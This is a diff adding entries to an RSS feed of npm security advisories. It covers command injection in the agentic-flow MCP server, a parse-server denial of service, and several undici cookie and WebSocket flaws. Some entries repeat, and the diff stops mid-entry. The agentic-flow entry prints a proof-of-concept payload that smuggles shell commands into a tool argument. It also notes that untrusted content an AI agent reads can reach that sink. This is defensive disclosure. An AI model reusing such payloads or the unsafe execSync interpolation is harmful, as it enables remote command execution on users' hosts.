@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-19T14:19:34.422Z</updated>
+    <updated>2026-06-19T16:42:11.797Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,471 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[agentic-flow] Agentic-Flow: OS Command Injection in agentic-flow MCP server tools via unsanitized tool-parameter interpolation into execSync]]></title>
+        <id>https://github.com/advisories/GHSA-vcv2-r9jh-99m5</id>
+        <link href="https://github.com/advisories/GHSA-vcv2-r9jh-99m5"/>
+        <updated>2026-06-19T15:13:00.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>agentic-flow</code> versions <code>&lt;= 2.0.13</code> MCP server tools interpolated attacker-influenceable tool parameters (e.g. <code>agent</code>, <code>task</code>, <code>name</code>, <code>language</code>, <code>agentdb</code> arguments) directly into shell command strings passed to <code>execSync()</code>. A malicious value reaching any of the affected MCP tools could break out of the surrounding double-quoted argument and execute arbitrary OS commands with the privileges of the user running the MCP server.</p>
+<p>This was a partial-fix gap: prior commit <code>6a06854</code> (#158) fixed CWE-78 elsewhere in the project but missed the MCP server files entirely.</p>
+<h2 id="impact">Impact</h2>
+<p>Any MCP tool argument that the AI agent treats as data but the implementation interpolates into a shell command string becomes a command-injection vector. In MCP deployments where untrusted content (web pages, files, third-party tool output) is processed by the agent, this is reachable without direct attacker access to the host. The HTTP/SSE transports (<code>http-sse.ts</code>, <code>http-streaming-updated.ts</code>) expose the same sinks without authentication or Origin/Host validation, which may raise the effective severity in any deployment that binds them to a reachable network interface.</p>
+<h2 id="affected-components">Affected components</h2>
+<ul>
+<li><code>src/mcp/standalone-stdio.ts</code> — <code>agentic_flow_agent</code>, <code>agentic_flow_create_agent</code>, <code>agentic_flow_list_all_agents</code>, <code>agentic_flow_agent_info</code>, <code>agentic_flow_check_conflicts</code>, <code>agentic_flow_optimize_model</code>, <code>agentic_flow_list_agents</code>, <code>agent_booster_edit_file</code>, <code>agent_booster_batch_edit</code>, <code>agent_booster_parse_markdown</code>, <code>agentdb_stats</code>, <code>agentdb_pattern_store</code>, <code>agentdb_pattern_search</code>, <code>agentdb_pattern_stats</code></li>
+<li><code>src/mcp/fastmcp/servers/claude-flow-sdk.ts</code></li>
+<li><code>src/mcp/fastmcp/servers/stdio-full.ts</code></li>
+<li><code>src/mcp/fastmcp/servers/http-streaming-updated.ts</code></li>
+<li><code>src/mcp/fastmcp/servers/http-sse.ts</code></li>
+<li><code>src/mcp/fastmcp/servers/poc-stdio.ts</code></li>
+<li><code>src/mcp/fastmcp/tools/agent/{execute,list,parallel}.ts</code></li>
+<li><code>src/mcp/fastmcp/tools/swarm/orchestrate.ts</code></li>
+<li><code>src/mcp/fastmcp/tools/hooks/pretrain.ts</code> (depth path only)</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-ts">// Pre-fix (standalone-stdio.ts, agentic_flow_agent)
+let cmd = `npx --yes agentic-flow --agent "${agent}" --task "${task}"`;
+const result = execSync(cmd, { encoding: 'utf-8', ... });
+</code></pre>
+<p>Invoking the MCP tool with:</p>
+<pre><code class="language-json">{
+  "agent": "coder",
+  "task": "x\"; touch /tmp/INJECTED; id &gt; /tmp/rce.txt; echo \""
+}
+</code></pre>
+<p>produces, after interpolation:</p>
+<pre><code>npx --yes agentic-flow --agent "coder" --task "x"; touch /tmp/INJECTED; id &gt; /tmp/rce.txt; echo ""
+</code></pre>
+<p>When <code>execSync</code> hands that to <code>/bin/sh -c</code>, the shell parses three commands: the truncated <code>npx</code>, then <code>touch /tmp/INJECTED</code>, then <code>id &gt; /tmp/rce.txt; echo ""</code>. The marker file <code>/tmp/INJECTED</code> is created and the user's <code>id</code> output is written to <code>/tmp/rce.txt</code>.</p>
+<h2 id="patches">Patches</h2>
+<p>Fixed in <a href="https://www.npmjs.com/package/agentic-flow/v/2.0.14"><code>agentic-flow@2.0.14</code></a> — every affected call site rewritten to use <code>execFileSync(file, argv, { shell: false })</code> so attacker-controlled argv elements are passed straight to <code>execve(2)</code> without shell parsing.</p>
+<p>Fix PR: ruvnet/agentic-flow#170 (merged at <code>0c2ec96</code>)</p>
+<p>A regression test (<code>tests/security/cwe-78-mcp-execsync.test.ts</code>) was added that statically scans every <code>src/mcp/**/*.ts</code> file and fails the build if any new <code>execSync()</code> call is reintroduced outside of a documented exemption, plus a behavioural smoke check that the canonical PoC payload remains inert when passed as an argv element to <code>execFileSync</code>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Upgrade to <code>agentic-flow &gt;= 2.0.14</code>. There is no in-product configuration that mitigates this without upgrading.</p>
+<h2 id="downstream-pin">Downstream pin</h2>
+<p>The <code>ruflo</code> / <code>claude-flow</code> / <code>@claude-flow/cli</code> packages bumped from <code>3.12.3</code> → <code>3.12.4</code> to pull the patched <code>agentic-flow</code>:</p>
+<ul>
+<li><code>ruflo@3.12.4</code></li>
+<li><code>claude-flow@3.12.4</code></li>
+<li><code>@claude-flow/cli@3.12.4</code></li>
+</ul>
+<p>End users running any of <code>npx ruflo@latest</code>, <code>npx claude-flow@latest</code>, or <code>npx @claude-flow/cli@latest</code> are pinned to the fixed version.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by <strong>hackchang</strong> via a well-scoped red-team report package (<code>npm_agentic-flow_report_package_20260618_163017.zip</code>) that included a sink inventory, a minimized PoC payload, and a clear explanation of why this was a partial-fix gap rather than intended behaviour. The sink inventory directly drove the single-grep pass that closed every reachable call site; the PoC payload became the behavioural smoke test that proves the canonical attack stays inert as an argv element.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruvnet/agentic-flow/security/advisories/GHSA-vcv2-r9jh-99m5">https://github.com/ruvnet/agentic-flow/security/advisories/GHSA-vcv2-r9jh-99m5</a></li>
+<li><a href="https://github.com/ruvnet/agentic-flow/issues/169">https://github.com/ruvnet/agentic-flow/issues/169</a></li>
+<li><a href="https://github.com/ruvnet/ruflo/issues/2414">https://github.com/ruvnet/ruflo/issues/2414</a></li>
+<li><a href="https://github.com/ruvnet/agentic-flow/pull/170">https://github.com/ruvnet/agentic-flow/pull/170</a></li>
+<li><a href="https://github.com/ruvnet/ruflo/pull/2415">https://github.com/ruvnet/ruflo/pull/2415</a></li>
+<li><a href="https://github.com/ruvnet/ruflo/releases/tag/v3.12.4">https://github.com/ruvnet/ruflo/releases/tag/v3.12.4</a></li>
+<li><a href="https://www.npmjs.com/package/agentic-flow/v/2.0.14">https://www.npmjs.com/package/agentic-flow/v/2.0.14</a></li>
+<li><a href="https://github.com/advisories/GHSA-vcv2-r9jh-99m5">https://github.com/advisories/GHSA-vcv2-r9jh-99m5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vcv2-r9jh-99m5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T15:12:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] parse-server: Denial of service via exponential-time processing of deeply nested query operators]]></title>
+        <id>https://github.com/advisories/GHSA-cgxm-vr2f-6fj8</id>
+        <link href="https://github.com/advisories/GHSA-cgxm-vr2f-6fj8"/>
+        <updated>2026-06-19T14:50:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Parse Server is vulnerable to denial of service. A remote attacker can send a single, small query (~1 KB) containing deeply nested query condition operators. Parse Server processes the nested structure with exponential time complexity, which blocks the Node.js event loop and makes the server unresponsive to all clients for the duration of processing. A single request can occupy the event loop for many seconds, and the request is repeatable. The issue affects the REST API and LiveQuery query handling and is reachable in the default configuration. Exploitation requires only the public application identifier; no user authentication is needed.</p>
+<h3 id="patches">Patches</h3>
+<p>The internal query-traversal helper that previously re-walked nested arrays — causing exponential-time processing of nested <code>$or</code>/<code>$and</code>/<code>$nor</code> operators — was corrected to traverse queries in linear time. Additionally, the optional <code>requestComplexity.queryDepth</code> limit was generalized so that nested logical operators are counted even when wrapped inside field-level operators (e.g. <code>$elemMatch</code>, <code>$not</code>) or plain field names, closing a bypass of the limit on both the REST API and LiveQuery.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no complete configuration-only workaround on affected versions. Setting <code>requestComplexity.queryDepth</code> to a small positive integer reduces exposure but does not fully prevent the issue, because the limit can be bypassed by nesting the operators inside a field-level operator. Upgrading is strongly recommended.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-cgxm-vr2f-6fj8">https://github.com/parse-community/parse-server/security/advisories/GHSA-cgxm-vr2f-6fj8</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10511">https://github.com/parse-community/parse-server/pull/10511</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10512">https://github.com/parse-community/parse-server/pull/10512</a></li>
+<li><a href="https://github.com/advisories/GHSA-cgxm-vr2f-6fj8">https://github.com/advisories/GHSA-cgxm-vr2f-6fj8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cgxm-vr2f-6fj8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:50:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] parse-server: Denial of service via exponential-time processing of deeply nested query operators]]></title>
+        <id>https://github.com/advisories/GHSA-cgxm-vr2f-6fj8</id>
+        <link href="https://github.com/advisories/GHSA-cgxm-vr2f-6fj8"/>
+        <updated>2026-06-19T14:50:16.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Parse Server is vulnerable to denial of service. A remote attacker can send a single, small query (~1 KB) containing deeply nested query condition operators. Parse Server processes the nested structure with exponential time complexity, which blocks the Node.js event loop and makes the server unresponsive to all clients for the duration of processing. A single request can occupy the event loop for many seconds, and the request is repeatable. The issue affects the REST API and LiveQuery query handling and is reachable in the default configuration. Exploitation requires only the public application identifier; no user authentication is needed.</p>
+<h3 id="patches">Patches</h3>
+<p>The internal query-traversal helper that previously re-walked nested arrays — causing exponential-time processing of nested <code>$or</code>/<code>$and</code>/<code>$nor</code> operators — was corrected to traverse queries in linear time. Additionally, the optional <code>requestComplexity.queryDepth</code> limit was generalized so that nested logical operators are counted even when wrapped inside field-level operators (e.g. <code>$elemMatch</code>, <code>$not</code>) or plain field names, closing a bypass of the limit on both the REST API and LiveQuery.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no complete configuration-only workaround on affected versions. Setting <code>requestComplexity.queryDepth</code> to a small positive integer reduces exposure but does not fully prevent the issue, because the limit can be bypassed by nesting the operators inside a field-level operator. Upgrading is strongly recommended.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-cgxm-vr2f-6fj8">https://github.com/parse-community/parse-server/security/advisories/GHSA-cgxm-vr2f-6fj8</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10511">https://github.com/parse-community/parse-server/pull/10511</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10512">https://github.com/parse-community/parse-server/pull/10512</a></li>
+<li><a href="https://github.com/advisories/GHSA-cgxm-vr2f-6fj8">https://github.com/advisories/GHSA-cgxm-vr2f-6fj8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cgxm-vr2f-6fj8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:50:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching]]></title>
+        <id>https://github.com/advisories/GHSA-g8m3-5g58-fq7m</id>
+        <link href="https://github.com/advisories/GHSA-g8m3-5g58-fq7m"/>
+        <updated>2026-06-19T14:34:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>When undici parses a <code>Set-Cookie</code> header, it accepts any <code>SameSite</code> attribute value that contains <code>Strict</code>, <code>Lax</code>, or <code>None</code> as a substring, rather than the case-insensitive exact match specified by RFC 6265. Non-spec values are silently mapped to one of the three standard tokens:</p>
+<ul>
+<li><code>SameSite=NoneOfYourBusiness</code> is parsed as <code>None</code>, the most permissive setting.</li>
+<li><code>SameSite=StrictLax</code> is parsed as <code>Lax</code>, a downgrade from <code>Strict</code>.</li>
+</ul>
+<p>Affected applications are those that consume <code>Set-Cookie</code> headers from server responses (for example via undici's <code>fetch</code> or proxy code paths) and then forward or rely on the parsed <code>sameSite</code> attribute. A malicious or non-compliant server can coerce the consumer's view of a cookie's SameSite policy to a weaker value, silently degrading the SameSite enforcement the cookie is supposed to provide.</p>
+<p>This was introduced in undici 5.15.0 when the cookies feature was added.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>After parsing a <code>Set-Cookie</code> header, validate that the resulting <code>sameSite</code> attribute is one of <code>'Strict'</code>, <code>'Lax'</code>, or <code>'None'</code> (exact, case-insensitive) before forwarding or relying on it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m">https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11525">https://nvd.nist.gov/vuln/detail/CVE-2026-11525</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g8m3-5g58-fq7m">https://github.com/advisories/GHSA-g8m3-5g58-fq7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g8m3-5g58-fq7m</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-19T14:34:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching]]></title>
+        <id>https://github.com/advisories/GHSA-g8m3-5g58-fq7m</id>
+        <link href="https://github.com/advisories/GHSA-g8m3-5g58-fq7m"/>
+        <updated>2026-06-19T14:34:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>When undici parses a <code>Set-Cookie</code> header, it accepts any <code>SameSite</code> attribute value that contains <code>Strict</code>, <code>Lax</code>, or <code>None</code> as a substring, rather than the case-insensitive exact match specified by RFC 6265. Non-spec values are silently mapped to one of the three standard tokens:</p>
+<ul>
+<li><code>SameSite=NoneOfYourBusiness</code> is parsed as <code>None</code>, the most permissive setting.</li>
+<li><code>SameSite=StrictLax</code> is parsed as <code>Lax</code>, a downgrade from <code>Strict</code>.</li>
+</ul>
+<p>Affected applications are those that consume <code>Set-Cookie</code> headers from server responses (for example via undici's <code>fetch</code> or proxy code paths) and then forward or rely on the parsed <code>sameSite</code> attribute. A malicious or non-compliant server can coerce the consumer's view of a cookie's SameSite policy to a weaker value, silently degrading the SameSite enforcement the cookie is supposed to provide.</p>
+<p>This was introduced in undici 5.15.0 when the cookies feature was added.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>After parsing a <code>Set-Cookie</code> header, validate that the resulting <code>sameSite</code> attribute is one of <code>'Strict'</code>, <code>'Lax'</code>, or <code>'None'</code> (exact, case-insensitive) before forwarding or relying on it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m">https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11525">https://nvd.nist.gov/vuln/detail/CVE-2026-11525</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g8m3-5g58-fq7m">https://github.com/advisories/GHSA-g8m3-5g58-fq7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g8m3-5g58-fq7m</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-19T14:34:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching]]></title>
+        <id>https://github.com/advisories/GHSA-g8m3-5g58-fq7m</id>
+        <link href="https://github.com/advisories/GHSA-g8m3-5g58-fq7m"/>
+        <updated>2026-06-19T14:34:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>When undici parses a <code>Set-Cookie</code> header, it accepts any <code>SameSite</code> attribute value that contains <code>Strict</code>, <code>Lax</code>, or <code>None</code> as a substring, rather than the case-insensitive exact match specified by RFC 6265. Non-spec values are silently mapped to one of the three standard tokens:</p>
+<ul>
+<li><code>SameSite=NoneOfYourBusiness</code> is parsed as <code>None</code>, the most permissive setting.</li>
+<li><code>SameSite=StrictLax</code> is parsed as <code>Lax</code>, a downgrade from <code>Strict</code>.</li>
+</ul>
+<p>Affected applications are those that consume <code>Set-Cookie</code> headers from server responses (for example via undici's <code>fetch</code> or proxy code paths) and then forward or rely on the parsed <code>sameSite</code> attribute. A malicious or non-compliant server can coerce the consumer's view of a cookie's SameSite policy to a weaker value, silently degrading the SameSite enforcement the cookie is supposed to provide.</p>
+<p>This was introduced in undici 5.15.0 when the cookies feature was added.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>After parsing a <code>Set-Cookie</code> header, validate that the resulting <code>sameSite</code> attribute is one of <code>'Strict'</code>, <code>'Lax'</code>, or <code>'None'</code> (exact, case-insensitive) before forwarding or relying on it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m">https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11525">https://nvd.nist.gov/vuln/detail/CVE-2026-11525</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g8m3-5g58-fq7m">https://github.com/advisories/GHSA-g8m3-5g58-fq7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g8m3-5g58-fq7m</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-19T14:34:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to HTTP header injection via Set-Cookie percent-decoding]]></title>
+        <id>https://github.com/advisories/GHSA-p88m-4jfj-68fv</id>
+        <link href="https://github.com/advisories/GHSA-p88m-4jfj-68fv"/>
+        <updated>2026-06-19T14:23:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>undici's cookie parser in <code>parseSetCookie</code> percent-decodes cookie values via <code>qsUnescape</code>, turning encoded sequences like <code>%0D%0A</code>, <code>%00</code>, <code>%3B</code>, and <code>%3D</code> into their literal byte equivalents. RFC 6265 §5.4 does not specify any decoding and browsers do not decode either.</p>
+<p>Applications that parse a <code>Set-Cookie</code> header and then forward the parsed value into a response header (proxies, middleware, SSR frameworks) become vulnerable to HTTP response header injection: an attacker-controlled upstream can inject arbitrary <code>Set-Cookie</code>, <code>Location</code>, or <code>Cache-Control</code> headers into the application's downstream response, enabling session fixation, open redirect, or cache poisoning.</p>
+<p>Affected applications are those that use undici's cookie parsing (<code>parseSetCookie</code>, <code>parseCookie</code>, <code>getSetCookies</code>) and forward the parsed cookie value into a response header.</p>
+<p>This was introduced in undici 7.0.0 via <a href="https://github.com/nodejs/undici/pull/3789">#3789</a>.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>If upgrade is not immediately possible, do not forward values returned by <code>parseSetCookie</code>/<code>parseCookie</code>/<code>getSetCookies</code> directly into response headers; sanitize the value first to strip or reject CR, LF, NUL, <code>;</code>, and <code>=</code> bytes.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv">https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9679">https://nvd.nist.gov/vuln/detail/CVE-2026-9679</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-p88m-4jfj-68fv">https://github.com/advisories/GHSA-p88m-4jfj-68fv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p88m-4jfj-68fv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-19T14:21:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to HTTP header injection via Set-Cookie percent-decoding]]></title>
+        <id>https://github.com/advisories/GHSA-p88m-4jfj-68fv</id>
+        <link href="https://github.com/advisories/GHSA-p88m-4jfj-68fv"/>
+        <updated>2026-06-19T14:23:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>undici's cookie parser in <code>parseSetCookie</code> percent-decodes cookie values via <code>qsUnescape</code>, turning encoded sequences like <code>%0D%0A</code>, <code>%00</code>, <code>%3B</code>, and <code>%3D</code> into their literal byte equivalents. RFC 6265 §5.4 does not specify any decoding and browsers do not decode either.</p>
+<p>Applications that parse a <code>Set-Cookie</code> header and then forward the parsed value into a response header (proxies, middleware, SSR frameworks) become vulnerable to HTTP response header injection: an attacker-controlled upstream can inject arbitrary <code>Set-Cookie</code>, <code>Location</code>, or <code>Cache-Control</code> headers into the application's downstream response, enabling session fixation, open redirect, or cache poisoning.</p>
+<p>Affected applications are those that use undici's cookie parsing (<code>parseSetCookie</code>, <code>parseCookie</code>, <code>getSetCookies</code>) and forward the parsed cookie value into a response header.</p>
+<p>This was introduced in undici 7.0.0 via <a href="https://github.com/nodejs/undici/pull/3789">#3789</a>.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>If upgrade is not immediately possible, do not forward values returned by <code>parseSetCookie</code>/<code>parseCookie</code>/<code>getSetCookies</code> directly into response headers; sanitize the value first to strip or reject CR, LF, NUL, <code>;</code>, and <code>=</code> bytes.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv">https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9679">https://nvd.nist.gov/vuln/detail/CVE-2026-9679</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-p88m-4jfj-68fv">https://github.com/advisories/GHSA-p88m-4jfj-68fv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p88m-4jfj-68fv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-19T14:21:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to HTTP header injection via Set-Cookie percent-decoding]]></title>
+        <id>https://github.com/advisories/GHSA-p88m-4jfj-68fv</id>
+        <link href="https://github.com/advisories/GHSA-p88m-4jfj-68fv"/>
+        <updated>2026-06-19T14:23:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>undici's cookie parser in <code>parseSetCookie</code> percent-decodes cookie values via <code>qsUnescape</code>, turning encoded sequences like <code>%0D%0A</code>, <code>%00</code>, <code>%3B</code>, and <code>%3D</code> into their literal byte equivalents. RFC 6265 §5.4 does not specify any decoding and browsers do not decode either.</p>
+<p>Applications that parse a <code>Set-Cookie</code> header and then forward the parsed value into a response header (proxies, middleware, SSR frameworks) become vulnerable to HTTP response header injection: an attacker-controlled upstream can inject arbitrary <code>Set-Cookie</code>, <code>Location</code>, or <code>Cache-Control</code> headers into the application's downstream response, enabling session fixation, open redirect, or cache poisoning.</p>
+<p>Affected applications are those that use undici's cookie parsing (<code>parseSetCookie</code>, <code>parseCookie</code>, <code>getSetCookies</code>) and forward the parsed cookie value into a response header.</p>
+<p>This was introduced in undici 7.0.0 via <a href="https://github.com/nodejs/undici/pull/3789">#3789</a>.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>If upgrade is not immediately possible, do not forward values returned by <code>parseSetCookie</code>/<code>parseCookie</code>/<code>getSetCookies</code> directly into response headers; sanitize the value first to strip or reject CR, LF, NUL, <code>;</code>, and <code>=</code> bytes.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv">https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9679">https://nvd.nist.gov/vuln/detail/CVE-2026-9679</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-p88m-4jfj-68fv">https://github.com/advisories/GHSA-p88m-4jfj-68fv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p88m-4jfj-68fv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-19T14:21:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici WebSocket client vulnerable to denial of service via fragment count bypass]]></title>
+        <id>https://github.com/advisories/GHSA-vxpw-j846-p89q</id>
+        <link href="https://github.com/advisories/GHSA-vxpw-j846-p89q"/>
+        <updated>2026-06-19T14:23:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>The undici WebSocket client enforces <code>maxPayloadSize</code> on the cumulative byte count of fragments in a message but does not enforce a limit on the number of fragments. A malicious WebSocket server can stream many small or empty continuation frames that each pass per-frame and cumulative-size validation, collectively causing unbounded memory growth in the client process. The result is memory exhaustion and a denial of service.</p>
+<p>Affected applications are those using the undici WebSocket client (<code>new WebSocket(...)</code>) or the <code>WebSocketStream</code> API that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.</p>
+<p>All releases starting at undici 6.17.0 are affected.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>No workaround is available. The fix must be applied through an upgrade.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q">https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12151">https://nvd.nist.gov/vuln/detail/CVE-2026-12151</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-vxpw-j846-p89q">https://github.com/advisories/GHSA-vxpw-j846-p89q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vxpw-j846-p89q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:22:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici WebSocket client vulnerable to denial of service via fragment count bypass]]></title>
+        <id>https://github.com/advisories/GHSA-vxpw-j846-p89q</id>
+        <link href="https://github.com/advisories/GHSA-vxpw-j846-p89q"/>
+        <updated>2026-06-19T14:23:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
